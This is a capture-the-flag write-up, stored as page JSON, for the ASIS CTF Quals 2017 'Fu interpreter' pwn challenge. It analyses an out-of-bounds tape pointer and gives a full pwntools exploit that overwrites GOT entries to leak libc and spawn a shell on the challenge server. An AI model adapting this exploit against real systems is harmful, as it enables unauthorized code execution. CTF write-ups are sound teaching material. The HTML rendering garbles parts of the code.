{"pageContext":{"html":"<p><a href=\"ctf=asis-ctf-quals-2017\"></a>\n<a href=\"type=exploit\"></a>\n<a href=\"tags=brainfuck\"></a>\n<a href=\"tools=pwntools\"></a>\n<a href=\"techniques=GOT%20overwrite\"></a></p>\n<h1>Fu interpreter (pwn-101)</h1>\n<p>We are given a <a href=\"/fulang_e62955ff8cc20de534a29321b80fa246ddf9763f-8d5c8e43edcfa7d21d55677293e12e50.\">file</a>.</p>\n<p><code>bash $ file fulang_e62955ff8cc20de534a29321b80fa246ddf9763f fulang_e62955ff8cc20de534a29321b80fa246ddf9763f: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=746b0bdb7782ec102b56e6b27507d264920be051, not stripped $ checksec ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f [*] '/tmp/fulang_e62955ff8cc20de534a29321b80fa246ddf9763f' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE</code>\nThe file is not stripped, so the decompilation is quite neat. There are only two functions of interest <em>main</em> and <em>fu_interpreter</em>.</p>\n<p>`<code></code>c\nint fu_interpreter(char a1, char a2)\n{\n_BYTE *v2; // ebx@13\nchar v3; // dl@15\nsigned int result; // eax@20</p>\n<p>  if ( a1 == ':' )\n{\nif ( a2 == '&#x3C;' )\n--fu;\nif ( a2 == '>' )\n++fu;\nif ( a2 == '+' )\n++<em>(_BYTE *)fu;\nif ( a2 == '-' )\n--</em>(<em>BYTE <em>)fu;\nif ( a2 == ':' )\nputchar(</em>(</em>BYTE <em>)fu);\nif ( a2 == '.' )\n{\nv2 = (<em>BYTE *)fu;\n*v2 = getchar();\n}\nif ( a2 == '</em>' )\n{\nv3 = (</em>(<em>BYTE *)fu)++;\n*(</em>BYTE *)fu ^= v3;\n}\nif ( a2 == '(' )\nputs(\"Not implemented yet!\");\nif ( a2 == ')' )\nputs(\"Not implemented yet!\");\nresult = 1;\n}\nelse\n{\nresult = 0;\n}\nreturn result;\n}</p>\n<p>int main(int argc, const char **argv, const char **envp)\n{\nint v4; // edi@6\nsigned __int32 i; // [sp+10h][bp-dch]@1\nsigned __int32 v6; // [sp+14h][bp-d8h]@1\nchar s[4]; // [sp+18h][bp-d4h]@1\nchar v8; // [sp+1Ch][bp-d0h]@1\nint v9; // [sp+E0h][bp-ch]@1\nint *v10; // [sp+E8h][bp-4h]@1</p>\n<p>  fu = (int)&#x26;data;\nsetvbuf(stdout, 0, 2, 0);\nsetvbuf(stdin, 0, 2, 0);\nprintf(\"%s\", \"[Fulang service]\\nEnter your code:\");\nfgets(s, 150, stdin);\nv6 = strlen(s);\nfor ( i = 0; i &#x3C; v6; i += 2 )\n{\nif ( !fu_interpreter(s[i], s[i + 1]) )\n{\nputs(\"Incorrect syntax, RTFM!\");\nbreak;\n}\n}\nreturn 0;\n}\n`<code></code>\nThe logic is very simple. It takes 150 bytes of brainfuck-like code and then evaluates it. One thing to note is <em>fu</em> and <em>data</em> are global variables. Array <em>data</em> is used as tape for the program to operate but since there are no bounds check on it, we can operate past it.</p>\n<p><code>bash $ gdb -q ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f Loaded 105 commands. Type pwndbg [filter] for a list. Reading symbols from ./fulang_e62955ff8cc20de534a29321b80fa246ddf9763f...(no debugging symbols found)...done. pwndbg> p/x &#x26;fu $1 = 0x804a060 pwndbg> p/x &#x26;data $2 = 0x804a080</code>\nDuring execution in main current cell position is maintained in <em>fu</em> variable and it can be changed with &#x3C; or >. Since we can have 75 operations max from the brainfuck code, we can control many bytes out of <em>data</em>. As we see above the actual <em>fu</em> is located only 0x20 bytes from <em>data</em>, we can underflow to <em>fu</em> and change it to any address such that in the next call of <em>fu_interpreter</em> we can gain arbitrary read and write on that address.</p>\n<p>Since we now have arbitrary read and write and Partial RELRO, we can leak and patch GOT entries.\nThe exploitation is quite simple now.</p>\n<ul>\n<li>First patch GOT['puts'] to main. This way we can reset <em>fu</em> on every puts()</li>\n<li>Leak GOT['_<em>libc</em>start_main']. We already have the system libc from the hint in the problem. This helps calculating address of system() in libc</li>\n<li>Call puts() and restart execution to reset <em>fu</em>.</li>\n<li>Patch GOT['strlen'] to libc system address since strlen takes only one param which is the user input, perfect to patch for system()</li>\n<li>Restart main() again and \"/bin/sh\"</li>\n</ul>\n<p>`<code></code>python\nfrom pwn import *</p>\n<p>context(arch='i386', os='linux', log_level='info')\nlocal = len(sys.argv) == 1\nmain = 0x80486de</p>\n<p>if not local:\ns=remote('69.90.132.40',4001)\n<strong>libc<em>start</em>main<em>base = 0x18540\nsystem</em>base = 0x3a940\nelse:\ns=process('./fulang<em>e62955ff8cc20de534a29321b80fa246ddf9763f')\n#gdb.attach(s)\nraw</em>input()\nprint hex(u32(s.leak(0x804a020,4)))\nprint s.libs()\n_<em>libc</em>start<em>main</em>base = 0x19970\nsystem_base = 0x3e3e0\np = \":(:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:.:.:>:.:>:.:>:.:>:::>:::>:::>:::>:::>:::>:::>::\"\np += \":\"*(146-(len(p)))\np += \"??\" #force puts() to restart main()\ns.recvline()\ns.send(p)\ns.send(\":\\x1c\"+p32(main)) # patch GOT['puts'] to main\ns.recvline()\ns.recv(4) #leak strlen\n_<em>libc</em>start<em>main</em>leak = u32(s.recv(4)) # leak _<em>libc</em>start<em>main\nlibc</em>base = _<em>libc</em>start<em>main</em>leak - _<em>libc</em>start<em>main</em>base\nsystem = libc<em>base + system</em>base\nprint \"leak\",hex(</strong>libc<em>start</em>main_leak), hex(system)\ntime.sleep(2)\np = \":&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:&#x3C;:.:&#x3C;:.:>:.:>:.:>:.:>\"\np += \":\"*(146-(len(p)))\np += \"??\" #force puts() to restart main()\ns.recvline()\ns.send(p)</p>\n<p>s.send(\":\\x21\"+p32(system)) #patch GOT['strlen'] to system\ns.sendline(\"/bin/sh\")\ns.interactive()\n`<code></code></p>\n<p><a href=\"https://asciinema.org/a/112058\"><img src=\"https://asciinema.org/a/112058.png\" alt=\"asciicast\"></a></p>","relativePath":"writeups/asis-ctf-quals-2017/pwn/fu-interpreter/sudhackar"}}